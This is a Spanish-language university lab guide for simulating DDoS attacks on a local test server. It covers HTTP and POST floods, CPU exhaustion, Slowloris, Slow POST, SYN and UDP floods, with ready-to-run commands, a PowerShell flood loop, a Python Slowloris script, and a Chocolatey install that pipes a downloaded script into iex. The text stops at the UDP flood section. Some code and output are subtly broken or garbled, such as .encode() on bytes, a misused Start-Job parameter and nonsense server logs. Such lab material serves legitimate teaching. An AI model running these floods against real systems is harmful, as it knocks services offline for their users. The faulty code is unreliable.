# 🧪 Laboratorio de Pruebas de Ataques DDoS - Guía Completa

> **Guía universitaria para la simulación y análisis de ataques DDoS en entorno controlado**

---

## 📖 Descripción del Contenido

### ¿Qué incluye esta guía?

Esta guía contiene un conjunto completo de prácticas de laboratorio para aprender a:
- Identificar y ejecutar diferentes tipos de ataques DDoS
- Utilizar herramientas de generación de carga y métricas
- Monitorear el comportamiento de un servidor bajo ataque
- Analizar los resultados y métricas obtenidas
- Comprender las capas del modelo OSI afectadas

### Finalidad

Diseñada como material de laboratorio académico para:
- Cursos de seguridad informática
- Estudios de redes y comunicaciones
- Prácticas de ciberseguridad
- Investigación de patrones de ataque y defensa

### Tipo de uso

⚠️ **IMPORTANTE**: Esta guía está diseñada exclusivamente para:
- Entornos de laboratorio controlados
- Tu propio equipo local
- Propositos educativos y de investigación
- Pruebas propias CON AUTORIZACIÓN

**Atacar servidores sin autorización es ILEGAL y PENABLE.**

---

## 📚 Índice Dinámico

### Sección 1: Preparación del Entorno
- [1.1 Requisitos Previos](#11-requisitos-previos)
- [1.2 Instalación del Proyecto](#12-instalación-del-proyecto)
- [1.3 Iniciar el Servidor](#13-iniciar-el-servidor)

### Sección 2: Herramientas de Laboratorio - Linux
- [2.1 wrk - Herramienta de carga HTTP](#21-wrk---herramienta-de-carga-http)
- [2.2 Apache Bench (ab)](#22-apache-bench-ab)
- [2.3 slowhttptest](#23-slowhttptest)
- [2.4 hping3](#24-hping3)
- [2.5 autocannon](#25-autocannon)
- [2.6 netstat/ss](#26-netstatss)
- [2.7 htop/top](#27-htoptop)

### Sección 3: Herramientas de Laboratorio - Windows PowerShell
- [3.1 Instalación en Windows](#31-instalación-en-windows)
- [3.2 Herramientas disponibles](#32-herramientas-disponibles)
- [3.3 Comandos equivalentes](#33-comandos-equivalentes)

### Sección 4: Tipos de Ataques - Guía Completa
- [4.1 HTTP Flood (GET)](#41-http-flood-get)
- [4.2 POST Flood](#42-post-flood)
- [4.3 CPU Exhaustion](#43-cpu-exhaustion)
- [4.4 Slowloris (Slow HTTP)](#44-slowloris-slow-http)
- [4.5 Slow POST Attack](#45-slow-post-attack)
- [4.6 SYN Flood](#46-syn-flood)
- [4.7 UDP Flood](#47-udp-flood)
- [4.8 Connection Exhaustion](#48-connection-exhaustion)
- [4.9 Amplification Attack](#49-amplification-attack)
- [4.10 Multivector Attack](#410-multivector-attack-ataque-combinado)

### Sección 5: Pruebas de Protección
- [5.1 Verificar que la API funciona](#51-verificar-que-la-api-funciona)
- [5.2 Prueba de Login Correcto](#52-prueba-de-login-correcto)
- [5.3 Prueba de Login Incorrecto](#53-prueba-de-login-incorrecto)
- [5.4 Prueba de Múltiples Login Incorrectos](#54-prueba-de-múltiples-login-incorrectos)
- [5.5 Prueba de Rate Limiting Global](#55-prueba-de-rate-limiting-global)
- [5.6 Ver Estado de Bloqueo](#56-ver-estado-de-bloqueo)
- [5.7 Ver Logs de Intentos](#57-ver-logs-de-intentos)

### Sección 6: Monitoreo en Vivo
- [6.1 Monitoreo de CPU y Memoria](#61-monitoreo-de-cpu-y-memoria)
- [6.2 Monitoreo de Conexiones](#62-monitoreo-de-conexiones)
- [6.3 Monitoreo de la API](#63-monitoreo-de-la-api)

### Sección 7: Scripts de Ataque
- [7.1ataque-login.sh](#71ataque-loginsh)
- [7.2ataque-global.sh](#72ataque-globalsh)
- [7.3 Ejecución de Scripts](#73-ejecución-de-scripts)

### Sección 8: Interpretación de Resultados
- [8.1Interpretación wrk](#81interpretación-wrk)
- [8.2Interpretación Apache Bench](#82interpretación-apache-bench)
- [8.3Interpretación autocannon](#83interpretación-autocannon)
- [8.4Interpretación slowhttptest](#84interpretación-slowhttptest)
- [8.5Interpretación hping3](#85interpretación-hping3)

### Sección 9: Matriz de Ataques vs Herramientas
- [Tabla comparativa](#tabla-comparativa-ataques-vs-herramientas)

### Sección 10: Recomendaciones y Notas
- [10.1 Recomendaciones para Pruebas](#101-recomendaciones-para-pruebas)
- [10.2Notas de Seguridad](#102notas-de-seguridad)

---

# SECCIÓN 1: PREPARACIÓN DEL ENTORNO

## 1.1 Requisitos Previos

Para ejecutar este laboratorio necesitas:

| Requisito | Versión mínima | Descripción |
|----------|---------------|-------------|
| Node.js | >= 18.x | Runtime de JavaScript |
| npm | >= 9.x | Gestor de paquetes |
|Sistema operativo| Linux/Windows | Sistema base |
| Terminal | Cualquiera | Para ejecutar comandos |

### Verificar instalación de Node.js:

```bash
node --version
# Salida esperada: v18.x.x o superior

npm --version
# Salida esperada: 9.x.x o superior
```

---

## 1.2 Instalación del Proyecto

### Pasos para Linux/macOS:

```bash
# 1. Navegar al directorio del proyecto
cd /home/apiTestDDos/api-test-ddos

# 2. Instalar dependencias
npm install

# 3. Compilar el proyecto
npm run build
```

### Pasos para Windows PowerShell:

```powershell
# 1. Navegar al directorio del proyecto
cd C:\home\apiTestDDos\api-test-ddos

# 2. Instalar dependencias
npm install

# 3. Compilar el proyecto
npm run build
```

**Salida esperada después de `npm install`:**

```
added 142 packages in 15s
```

**Salida esperada después de `npm run build`:**

```
√  compilation successful!
```

---

## 1.3 Iniciar el Servidor

### En Linux/macOS Terminal 1:

```bash
cd api-test-ddos
npm run start:dev
```

**Salida esperada:**

```
[Nest] 3489   - tslib loader
[Nest] 3489   - osilating at: - undefined - undefined
[Nest] 3489   - is up to use polling by watcher
[Nest] 3489 - App bootstrap
[Nest] 3489 - URI server is responding
🚀 Server running on http://localhost:3000
```

### En Windows PowerShell Terminal 1:

```powershell
cd api-test-ddos
npm run start:dev
```

**Salida esperada:**

```
[Nest] 3489   -  tsloader
[Nest] 3489   -  Nest application successfully started
🚀 Server running on http://localhost:3000
```

### Verificar que el servidor responde:

```bash
# Nueva terminal (Linux) o PowerShell (Windows)
curl http://localhost:3000/api
```

**Salida esperada:**

```
API DDoS Test Lab - Running
```

---

# SECCIÓN 2: HERRAMIENTAS DE LABORATORIO - LINUX

## 2.1 wrk - Herramienta de Carga HTTP

### Descripción

wrk es una herramienta de benchmarking HTTP moderna y de alto rendimiento. Usa una biblioteca de eventos basada en epoll/kqueue de Unix para manejar muchas conexiones simultáneas sin crear un hilo por solicitud.

### Características

- Alta HTTP benchmarking
- Soporte para scripts Lua personalizados
- Métricas detalladas de latencia
- Ligera y rápida de instalar

### Instalación en Linux (Ubuntu/Debian):

```bash
# Instalar dependencias
sudo apt update
sudo apt install build-essential libssl-dev git

# Clonar y compilar wrk
git clone https://github.com/wg/wrk.git wrk
cd wrk
make

# Mover el ejecutable
sudo cp wrk /usr/local/bin/

# Verificar
wrk --version
```

### Instalación en Linux (CentOS/RHEL):

```bash
sudo yum groupinstall 'Development Tools'
sudo yum install openssl-devel git

git clone https://github.com/wg/wrk.git wrk
cd wrk
make
sudo cp wrk /usr/local/bin/
```

### Uso Básico

```bash
# Sintaxis básica
wrk -t<threads> -c<connections> -d<duration> <url>

# Ejemplo básico - 12 threads, 400 conexiones, 30 segundos
wrk -t12 -c400 -d30s http://localhost:3000/api/status
```

### Parámetros

| Parámetro | Descripción | Ejemplo |
|----------|------------|---------|
| `-t` | Número de threads | `-t12` |
| `-c` | Número de conexiones | `-c400` |
| `-d` | Duración de la prueba | `-d30s` |
| `-s` | Script Lua | `-s script.lua` |
| `--latency` | Mostrar latencia | `--latency` |

### Ejemplo de Uso

```bash
# Prueba básica de carga
wrk -t8 -c200 -d30s http://localhost:3000/api/status

# Con latencia detallada
wrk -t12 -c400 -d30s --latency http://localhost:3000/api/status
```

### Ejemplo de Salida

```
Running 30s test @ http://localhost:3000/api/status
  12 threads and 400 connections
  Thread Stats   Avg      Stdev     Max   +/-Stdev
    Latency     45.23ms   12.34ms  98.45ms   76.00%
    Req/Sec    892.45     45.67  1200.00    72.00%
  267823 requests in 30.02s, 45.67MB read
Requests/sec:   8923.45
Transfer/sec:     1.52MB

Latency distribution:
    50%   42.00ms
    75%   58.00ms
    90%   72.00ms
    99%   98.45ms
```

---

## 2.2 Apache Bench (ab)

### Descripción

Apache Bench (ab) es una herramienta de benchmarking incluida con el servidor Apache. Es simple, widely available, y perfecta para pruebas básicas de carga HTTP.

### Características

- Incluida con Apache
- Muy fácil de usar
- Resultados rápidos de obtener
- Disponible en casi todos los sistemas

### Instalación en Linux:

```bash
# Ubuntu/Debian
sudo apt install apache2-utils

# CentOS/RHEL
sudo yum install httpd-tools
```

### Uso Básico

```bash
# Sintaxis
ab -n<requests> -c<concurrency> <url>

# Ejemplo
ab -n 10000 -c 500 http://localhost:3000/api/status
```

### Parámetros

| Parámetro | Descripción |
|-----------|-------------|
| `-n` | Número total de requests |
| `-c` | Concurrencia (solicitudes simultáneas) |
| `-p` | Archivo con datos POST |
| `-T` | Content-Type para POST |
| `-g` | Archivo de salida con resultados |

### Ejemplo de Uso

```bash
# GET básico
ab -n 10000 -c 500 http://localhost:3000/api/status

# POST con datos
echo '{"name":"test","value":123}' > payload.json
ab -n 5000 -c 200 -p payload.json -T application/json http://localhost:3000/api/items
```

### Ejemplo de Salida

```
Server Software:        Nest/10.x
Server Hostname:        localhost
Server Port:            3000

Document Path:          /api/status
Document Length:        35 bytes

Concurrency Level:      500
Time taken for tests:   15.432 seconds
Complete requests:      10000
Failed requests:        0
Non-2xx responses:      0
Requests per second:    648.23 [#/sec] (mean)
Time per request:       154.23 [ms] (mean)
Transfer rate:          89.45 [Kbytes/sec] received
```

### Métricas Clave

- **Complete requests**: Total de solicitudes procesadas
- **Failed requests**: Si > 0, el servidor está saturado
- **Requests per second**: Rendimiento del servidor
- **Time per request**: Tiempo promedio por request

---

## 2.3 slowhttptest

### Descripción

slowhttptest es una herramienta especializada para pruebas de Slow HTTP Attack. Simula conexiones lentas que mantienen conexiones abiertoes por mucho tiempo.

### Características

- Detección de vulnerabilidades slow HTTP
- Modes: Slowloris, Slow POST, Slow Read
- Configurable intervalo y velocidad
- Resultados detallados

### Instalación en Linux:

```bash
# Ubuntu/Debian
sudo apt install slowhttptest

# Desde código fuente
git clone https://github.com/shekyan/slowhttptest.git
cd slowhttptest
./configure && make && sudo make install
```

### Uso Básico

```bash
# Sintaxis
slowhttptest -c<connections> -o<output> -u<url> -t<method> -i<interval>

# Slowloris básico
slowhttptest -c 1000 -o slowloris_results.txt -u http://localhost:3000/api -t GET -i 15
```

### Parámetros

| Parámetro | Descripción |
|-----------|-------------|
| `-c` | Número de conexiones |
| `-o` | Archivo de salida |
| `-u` | URL objetivo |
| `-t` | Método HTTP (GET/POST) |
| `-i` | Intervalo entre envíos (segundos) |
| `-r` | Conexiones por segundo |

### Ejemplo de Uso

```bash
# Slowloris - 1000 conexiones
slowhttptest -c 1000 -o slowloris_results.txt -u http://localhost:3000/api -t GET -i 15

# Slow POST - 500 conexiones
slowhttptest -c 500 -o slowpost_results.txt -u http://localhost:3000/api/items -t POST -i 500 -r 50
```

### Ejemplo de Salida

```
slowhttptest v1.7

Configuration:
  Method: GET
  Connections: 1000
  Interval: 15 seconds

Progress:
  0:32 - connected: 856/1000
  0:45 - connected: 892/1000
  1:00 - connected: 901/1000
  ...
```

---

## 2.4 hping3

### Descripción

hping3 es una herramienta de línea de comandos para network packet crafting. Permite crear y enviar paquetes TCP/IP personalizados, útil para ataques de capa 3/4.

### Características

- Creación de paquetes personalizados
- Soporte para múltiples protocolos
- Modo traceroute
- Detección de firewall

### Instalación en Linux:

```bash
# Ubuntu/Debian
sudo apt install hping3

# CentOS/RHEL
sudo yum install hping3
```

### Uso Básico

```bash
# Sintaxis
hping3 -c<count> -d<size> -<flags> -w<window> -p<port> --flood <target>

# SYN Flood
sudo hping3 -c 10000 -d 100 -S -w 64 -p 3000 --flood 127.0.0.1
```

### Parámetros

| Parámetro | Descripción |
|-----------|-------------|
| `-c` | Count de paquetes |
| `-d` | Tamaño del payload |
| `-S` | Flag SYN |
| `-A` | Flag ACK |
| `-F` | Flag FIN |
| `-R` | Flag RST |
| `-w` | Window size |
| `-p` | Puerto |
| `--flood` | Modo flood (máxima velocidad) |
| `--udp` | Modo UDP |

### Ejemplo de Uso

```bash
# SYN Flood básico
sudo hping3 -c 10000 -d 100 -S -w 64 -p 3000 --flood 127.0.0.1

# UDP Flood
sudo hping3 --flood --udp -p 3000 127.0.0.1

# PingICMP
sudo hping3 -1 -c 10 127.0.0.1
```

### Ejemplo de Salida

```
HPING 127.0.0.1 (lo 127.0.0.1): S set, 40 headers + 0 data bytes
--- 127.0.0.1 hping statistics ---
157834 packets tramitted, 0 packets rcvd, 100% packet loss
--- 0.000000% packet loss, time 2345ms
```

---

## 2.5 autocannon

### Descripción

autocannon es una alternativa a wrk escrita en Node.js. Altamente configurable y con soporte para HTTPS.

### Características

- Escrita en Node.js
- Resultados detallados
- HTTPS support
- Personalizable

### Instalación en Linux:

```bash
# Como paquete npm global
sudo npm install -g autocannon

# Verificar
autocannon --version
```

### Uso Básico

```bash
# Sintaxis
autocannon -c<connections> -d<seconds> <url>

# Ejemplo
autocannon -c 200 -d 30 http://localhost:3000/api/status
```

### Parámetros

| Parámetro | Descripción |
|-----------|-------------|
| `-c` | Conexiones simultáneas |
| `-d` | Duración en segundos |
| `-p` | Pipes por connection |
| `-m` | Métodos |
| `-H` | Encabezados personalizados |

### Ejemplo de Uso

```bash
# Básico
autocannon -c 200 -d 30 http://localhost:3000/api/status

# Con conexiones
autocannon -c 500 -d 60 http://localhost:3000/api/items
```

### Ejemplo de Salida

```
Stat        Avg      Stdev    Max
Latency:   23.45ms   12.34ms 456.78ms
Req/Sec:   423.45    67.89   567.00
Req/Bytes: 15.23     4.56    23.00

Seconds: 30.02
Count:   12678
```

---

## 2.6 netstat/ss

### Descripción

herramientas para ver conexiones de red activas en el sistema.

### Instalación

Generalmente viene pré-instalado en Linux.

```bash
# Verificar conexiones al puerto 3000
ss -tan | grep :3000

# Contar conexiones
ss -tan | grep :3000 | wc -l

# Ver estados específicos
ss -tan | grep :3000 | grep ESTA
```

### Ejemplo de Salida

```
State      Recv-Q  Send-Q   Local Address:Port    Peer Address:Port
ESTAB      0       0        127.0.0.1:3000       127.0.0.1:52341
ESTAB      0       0        127.0.0.1:3000       127.0.0.1:52342
```

---

## 2.7 htop/top

### Descripción

htop y top son herramientas de monitoreo de procesos y recursos del sistema en tiempo real.

### Uso

```bash
# htop (más visual)
htop

# top (más básico)
top

# Ver proceso específico
ps aux | grep node

# CPU específico
top -p $(pgrep -f "node dist/main.js")
```

---

# SECCIÓN 3: HERRAMIENTAS DE LABORATORIO - WINDOWS POWERSHELL

## 3.1 Instalación en Windows

### Requisitos Previos

Windows PowerShell requiere algunas adaptaciones. Las herramientas de red Unix estándar no están disponibles directamente.

### Opciones de Instalación:

#### Opción 1: Windows Subsystem for Linux (WSL) - RECOMENDADO

```powershell
# Abrir PowerShell como Administrador
wsl --install

# Reiniciar el sistema
# Después de reiniciar, usar WSL como terminal Linux
wsl

# Instalar herramientas en WSL
sudo apt update
sudo apt install wrk apache2-utils hping3 slowhttptest autocannon
```

#### Opción 2: Chocolatey (Administrador de Paquetes Windows)

```powershell
# Instalar Chocolatey (ejecutar como Administrador)
Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))

# Instalar herramientas disponibles
choco install wrk -y
choco install apache-thrift -y
choco install hping -y
```

#### Opción 3: Node.js tools

```powershell
# Instalar autocannon (disponible via npm)
npm install -g autocannon

# Probar
autocannon -c 100 -d 10 http://localhost:3000/api/status
```

---

## 3.2 Herramientas Disponibles

| Herramienta | Windows | WSL | Notas |
|------------|---------|-----|-------|
| wrk | ⚠️ No native | ✅ | Usar WSL |
| Apache Bench | ⚠️ parcial | ✅ | chocolatey |
| slowhttptest | ❌ No | ✅ | WSL requerido |
| hping3 | ❌ No | ✅ | WSL requerido |
| autocannon | ✅ npm | ✅ | Funciona |
| curl | ✅ Windows10+ | ✅ | Pré-instalado |
| netstat | ✅ Windows | ✅ | Pré-instalado |

---

## 3.3 Comandos Equivalentes

### GET Request básico

```powershell
# PowerShell
Invoke-WebRequest -Uri http://localhost:3000/api/status

# Alias
iwr http://localhost:3000/api/status
```

### Múltiples Requests (simular ataque)

```powershell
# Bucle for básico
1..100 | ForEach-Object { Invoke-WebRequest -Uri http://localhost:3000/api/status -UseBasicParsing }

# Conjobs (más eficiente)
1..50 | ForEach-Object -Parallel { Invoke-WebRequest -Uri http://localhost:3000/api/status }
```

### Ver conexiones

```powershell
# Ver conexiones al puerto
Get-NetTCPConnection -LocalPort 3000

# Contar conexiones
(Get-NetTCPConnection -LocalPort 3000).Count
```

### Monitoreo de procesos

```powershell
# Ver procesos Node.js
Get-Process -Name node

# Ver recursos
Get-Process -Name node | Select-Object CPU, WorkingSet64, Handles
```

### HTTP Flood con PowerShell

```powershell
# Script básico de flooding
$target = "http://localhost:3000/api/status"
$connections = 200
$duration = 30

$jobs = @()
$sw = [Diagnostics.Stopwatch]::StartNew()

while ($sw.Elapsed.TotalSeconds -lt $duration) {
    $jobs += Start-Job -ScriptBlock {
        Invoke-WebRequest -Uri $using:target -UseBasicParsing
    } -ThrottleLimit $connections
}

$jobs | Wait-Job | Receive-Job
$jobs | Remove-Job
```

### Autocannon (funciona directo)

```powershell
# Instalar primero
npm install -g autocannon

# Ejecutar
autocannon -c 200 -d 30 http://localhost:3000/api/status

# Personalizado con headers
autocannon -c 100 -d 30 -H "Content-Type:application/json" http://localhost:3000/api/items
```

### POST Request

```powershell
# JSON POST
$body = @{
    name = "test"
    value = 123
} | ConvertTo-Json

Invoke-RestMethod -Uri http://localhost:3000/api/items -Method POST -Body $body -ContentType "application/json"
```

### Ver estado del servidor

```powershell
# GET simple
Invoke-RestMethod -Uri http://localhost:3000/api/status
```

### Medir tiempo de respuesta

```powershell
# Medir latencia
(Measure-Command {
    Invoke-WebRequest -Uri http://localhost:3000/api/status -UseBasicParsing
}).TotalMilliseconds
```

---

# SECCIÓN 4: TIPOS DE ATAQUES - GUÍA COMPLETA

⚠️ **IMPORTANTE**: Estas pruebas deben ejecutarse exclusivamente en tu propio entorno local. Atacar servidores sin autorización es ilegal.

---

## 4.1 HTTP Flood (GET)

### Descripción del Ataque

El HTTP Flood es un ataque de **capa 7 (Aplicación)** donde el atacante envía múltiples solicitudes HTTP GET simultáneamente para saturar el servidor con conexiones concurrentes.

### Capa del Modelo OSI

- **Capa 7**: Aplicación (HTTP)
- El ataque explota el protocolo HTTP
- consume recursos del servidor

### Objetivo

- Saturar el servidores de solicitudes
- Agotar conexiones disponibles
- Aumentar latencia
- Negar servicio a otros usuarios

### Endpoints Recomendados

- `/api` - Más simple
- `/api/status` - Con respuesta JSON
- `/api/items` - Con procesamiento de array

### Cómo Ejecutarlo

#### Con wrk (Linux):

```bash
# Básico - 12 threads, 400 conexiones, 30 segundos
wrk -t12 -c400 -d30s http://localhost:3000/api/status

# Intenso - más conexiones
wrk -t8 -c1000 -d60s http://localhost:3000/api/status

# Con latencia detallada
wrk -t12 -c400 -d30s --latency http://localhost:3000/api/status
```

#### Con Apache Bench (Linux):

```bash
# 10,000 requests, 500 concurrentes
ab -n 10000 -c 500 http://localhost:3000/api/status

# Con múltiples rondas
for i in {1..5}; do ab -n 1000 -c 100 http://localhost:3000/api/status; done
```

#### Con autocannon (Windows/Linux):

```bash
# 200 conexiones, 30 segundos
autocannon -c 200 -d 30 http://localhost:3000/api/status

# 500 conexiones, 60 segundos
autocannon -c 500 -d 60 http://localhost:3000/api/status
```

#### Con curl (básico - Linux/Windows):

```bash
# 1000 requests en paralelo (Linux)
for i in {1..1000}; do curl -s http://localhost:3000/api/status > /dev/null & done
wait

# PowerShell equivalente
1..1000 | ForEach-Object -Parallel { Invoke-WebRequest -Uri "http://localhost:3000/api/status" } -ThrottleLimit 500
```

### Salida Esperada - wrk

```
Running 30s test @ http://localhost:3000/api/status
  12 threads and 400 connections
  Thread Stats   Avg      Stdev     Max   +/-Stdev
    Latency     45.23ms   12.34ms  98.45ms   76.00%
    Req/Sec    892.45     45.67  1200.00    72.00%
  267823 requests in 30.02s, 45.67MB read
Requests/sec:   8923.45
Transfer/sec:     1.52MB

Latency distribution:
    50%   42.00ms
    75%   58.00ms
    90%   72.00ms
    99%   98.45ms
```

### Salida Esperada - Apache Bench

```
Server Software:        NestJS/10.x
Server Hostname:        localhost
Server Port:            3000

Document Path:          /api/status
Document Length:        35 bytes

Concurrency Level:      500
Time taken for tests:   15.432 seconds
Complete requests:      10000
Failed requests:        0
Non-2xx responses:      0
Requests per second:    648.23 [#/sec] (mean)
Time per request:       154.23 [ms] (mean)
Transfer rate:          89.45 [Kbytes/sec] received
```

### Métricas a Observar

- **Requests/sec**: Cuántos requests procesa por segundo
- **Latency**: Tiempo de respuesta (más bajo = mejor)
- **Stdev**: Desviación estándar (más bajo = más estable)
- **Failed requests**: Si aumentan, el servidor está saturado

### Monitoreo Durante el Ataque

```bash
# Terminal 2: Ver CPU
htop

# Terminal 3: Ver estado API
curl -s http://localhost:3000/api/status
```

---

## 4.2 POST Flood

### Descripción del Ataque

El POST Flood es un ataque que envía múltiples solicitudes POST con payloads (JSON, form data) para saturar el servidor procesando datos.

### Capa del Modelo OSI

- **Capa 7**: Aplicación (HTTP)
- Explota el procesamiento de datos del servidor

### Capa Affected

- Capa de Aplicación HTTP
- Procesamiento de corpo de solicitud

### Objetivos

- Agotar capacidad de procesamiento de POST
- saturar bandwidth con payloads
- Causing procesamiento intensivo

### Endpoints Recomendados

- `/api/items` (POST) - Crear items

### Cómo Ejecutarlo

#### Primero crear el payload:

```bash
echo '{"name":"test","value":123}' > payload.json
```

#### Con Apache Bench:

```bash
ab -n 5000 -c 200 -p payload.json -T application/json http://localhost:3000/api/items
```

#### Con wrk + script Lua:

```lua
-- post_attack.lua
wrk.method = "POST"
wrk.body   = '{"name":"test","value":123}'
wrk.headers["Content-Type"] = "application/json"

request = function()
    return wrk.format(nil, nil, nil, wrk.body)
end
```

```bash
wrk -t8 -c300 -d30s --script=post_attack.lua http://localhost:3000/api/items
```

#### Con PowerShell:

```powershell
$body = @{
    name = "testitem"
    value = 123
} | ConvertTo-Json

1..500 | ForEach-Object -Parallel {
    Invoke-RestMethod -Uri "http://localhost:3000/api/items" -Method POST -Body $body -ContentType "application/json"
} -ThrottleLimit 200
```

### Salida Esperada - Apache Bench

```
Server Software:        Nest/10.x
Server Hostname:        localhost
Server Port:            3000

Document Path:          /api/items
Document Length:        68 bytes

Concurrency Level:      200
Time taken for tests:   15.432 seconds
Complete requests:      5000
Failed requests:        0
Non-2xx responses:      0
Requests per second:    324.12 [#/sec] (mean)
Time per request:       617.05 [ms] (mean)
Transfer rate:         89.45 [Kbytes/sec] received
```

### Métricas a Observar

- **Failed requests**: Si aumentan, el servidor está saturado
- **Time per request**: Tiempo promedio por request
- **Transfer rate**: Ancho de banda consumido

---

## 4.3 CPU Exhaustion

### Descripción del Ataque

El CPU Exhaustion envía requests a endpoints que requieren procesamiento CPU-intensivo, agotando los recursos del procesador.

### Capa del Modelo OSI

- **Capa 7**: Aplicación
- Endpoints que calculan intensi

### Capa Affected

- Servidor backend
- Node.js event loop
- CPU cores

### Objetivo

- 100% CPU usage
- Block otros requests
- crash del servidor

### Endpoints Recomendados

- `/api/heavy` - Calcula 1M operaciones matemáticas

### Cómo Ejecutarlo

```bash
# wrk con endpoint heavy
wrk -t8 -c200 -d60s http://localhost:3000/api/heavy

# autocannon
autocannon -c 100 -d 30 http://localhost:3000/api/heavy

# Apache Bench
ab -n 1000 -c 50 http://localhost:3000/api/heavy
```

### Salida Esperada - wrk

```
Running 30s test @ http://localhost:3000/api/heavy
  8 threads and 100 connections
  Thread Stats   Avg      Stdev     Max   +/-Stdev
    Latency      2.45s    0.89s    4.32s    68.00%
    Req/Sec      0.89     0.34     2.00     72.00%
   26 requests in 30.02s, 4.52KB read
Requests/sec:     0.87
Transfer/sec:     0.15KB/s

Latency distribution:
    50%    2.10s
    75%    3.20s
    90%    4.00s
    99%    4.32s
```

### Métricas a Observar

- **Req/Sec** muy bajo (pocos requests por segundo)
- **Latency** muy alta (varios segundos)
- El servidor puede dejar de responder a otros requests

### Monitoreo del servidor:

```bash
# Verás uso de CPU al 100%
htop

# Estado de la API
curl -s http://localhost:3000/api/status
# {"status":"ok","uptime":125.45,"memory":{...},"requests":156}
```

---

## 4.4 Slowloris (Slow HTTP)

### Descripción del Ataque

El Slowloris abre múltiples conexiones HTTP y las mantiene abiertas el mayor tiempo posible, enviando headers incompletos periódicamente para evitar que el servidor cierre la conexión.

### Capa del Modelo OSI

- **Capa 7**: Aplicación (HTTP)
- Explota el tiempo de espera de headers

### Capa Affected

- Apache/Nginx thread pool
- Connection pool
- File descriptors

### Objetivo

- Mantener conexiones abiertas
- Agotar thread pool
- Prevenir nuevos conexiones

### Cómo Ejecutarlo

#### Con slowhttptest:

```bash
# Slowloris - 1000 conexiones, intervalo de 15 segundos
slowhttptest -c 1000 -o slowloris_results.txt -u http://localhost:3000/api -t GET -i 15

# Ver progreso en tiempo real
watch -n 1 'tail -20 slowloris_results.txt'
```

#### Con curl (manual):

```bash
# Abrir múltiples conexiones con timeout largo
for i in {1..500}; do
  curl -X GET -H "User-Agent: Slowloris" \
       -H "X-Slowloris: test" \
       --connect-timeout 99999 \
       -m 300 \
       http://localhost:3000/api > /dev/null &
done
```

#### Con Python:

```python
# slowloris.py
import socket
import time

def slowloris_attack(host, port, num_connections):
    sockets = []
    for _ in range(num_connections):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        s.send(b"GET /api HTTP/1.1\r\n")
        s.send(b"X-Slowloris: test\r\n".encode())
        sockets.append(s)
    
    while True:
        for s in sockets:
            try:
                s.send(b"X-A: b\r\n")
                time.sleep(15)
            except:
                pass

slowloris_attack("localhost", 3000, 500)
```

```bash
python3 slowloris.py
```

### Salida Esperada - slowhttptest

```
slowhttptest v1.7
Sun May 04 2025 12:00:00 EDT

Configuration:
  Connections: 1000
  Method: GET
  Interval: 15 seconds

Progress:
  0:32 - connected: 856/1000
  0:45 - connected: 892/1000
  1:00 - connected: 901/1000
  ...
```

### Métricas a Observar

- **connected**: Número de conexiones activas (debe mantenerse alto)
- En el servidor: muchas conexiones en estado `CLOSE_WAIT` o `TIME_WAIT`
- El servidor deja de responder a nuevos requests

### Ver conexiones en el servidor:

```bash
# Ver conexiones activas
ss -tan | grep :3000 | wc -l

# Ver estado de conexiones
ss -tan | grep :3000 | head -20
```

---

## 4.5 Slow POST Attack

### Descripción del Ataque

Similar a Slowloris pero envía el body del POST muy lentamente, manteniendo la conexión abierta y consumiendo recursos del servidor.

### Capa del Modelo OSI

- **Capa 7**: Aplicación (HTTP)

### Capa Affected

- Processing de request body
- Buffers de memoria
- Connection pool

### Objetivo

- Mantener conexiones pending
- Agotar memoria
- Prevenir requests legítimos

### Endpoints Recomendados

- `/api/items` (POST)

### Cómo Ejecutarlo

```bash
# slowhttptest - Slow POST
slowhttptest -c 1000 -o slowpost_results.txt -u http://localhost:3000/api/items -t POST -i 500 -r 50
```

**Parámetros:**
- `-c 1000`: 1000 conexiones
- `-i 500`: intervalo de 500 segundos entre datos
- `-r 50`: 50 conexiones por segundo

### Salida Esperada

```
slowhttptest output:
Progress: 0:15 - connected: 543/1000, pending: 456, complete: 0
Progress: 0:30 - connected: 678/1000, pending: 322, complete: 0
...
```

### Métricas a Observar

- **pending**: Conexiones esperando datos
- El servidor consume memoria procesando cuerpos vacíos
- Nuevos requests fallan por timeout

---

## 4.6 SYN Flood

### Descripción del Ataque

El SYN Flood es un ataque de **capa 3/4** que envía paquetes TCP con el flag SYN establecido, pero nunca completa el handshake (no envía ACK). El servidor mantiene conexiones semi-abiertas hasta agotar recursos.

### Capa del Modelo OSI

- **Capa 4**: Transporte (TCP)
- **Capa 3**: Red (IP)

### Capa Affected

- TCP stack del kernel
- Tabla de conexiones
- Recursos de red

### Objetivo

- Mantener conexiones semi-abiertas
- Agotar tabla SYN
- Prevenir handshake

### Cómo Ejecutarlo

```bash
# Instalar hping3 si no está
sudo apt install hping3

# SYN Flood básico
sudo hping3 -c 10000 -d 100 -S -w 64 -p 3000 --flood 127.0.0.1

# Parámetros:
# -c 10000   = 10,000 paquetes
# -d 100     = tamaño del payload
# -S         = flag SYN
# -w 64      = window size
# -p 3000    = puerto destino
# --flood    = enviar tan rápido como sea posible

# Variante más agresiva
sudo hping3 --flood -S -p 3000 127.0.0.1
```

### Salida Esperada

```
HPING 127.0.0.1 (lo 127.0.0.1): S set, 40 headers + 0 data bytes
--- 127.0.0.1 hping statistic ---
157834 packets tramitted, 0 packets rcvd, 100% packet loss
--- 0.000000% packet loss, time 2345ms
```

### En el servidor (ver conexiones):

```bash
# Ver conexiones en estado SYN_RECV
ss -tan | grep SYN-RECV | wc -l

# Ver tabla de conexiones
netstat -ant | grep :3000
```

### Métricas a Observar

- **SYN_RECV**: Muchas conexiones en este estado = ataque activo
- Paquetes perdidos (packet loss)
- El servidor puede dejar de aceptar nuevas conexiones

---

## 4.7 UDP Flood

### Descripción del Ataque

El UDP Flood envía paquetes UDP al servidor, saturando el ancho de banda de red.

### Capa del Modelo OSI

- **Capa 3**: Red (IP)
- **Capa 4**: Transporte (UDP)

### Capa Affected

- Ancho de banda de red
- Network interface
- Router/switch

### Objetivo

- Saturar ancho de banda
- Causando network congestion
- Packet loss

### Cómo Ejecutarlo

```bash
# Con hping3 - UDP Flood
sudo hping3 --flood --udp -p 3000 127.0.0.1

# Con sniffles (más configurable)
sudo hping3 -2 -c 50000 -p 3000 --flood 127.0.0.1
```

### Salida Esperada

```
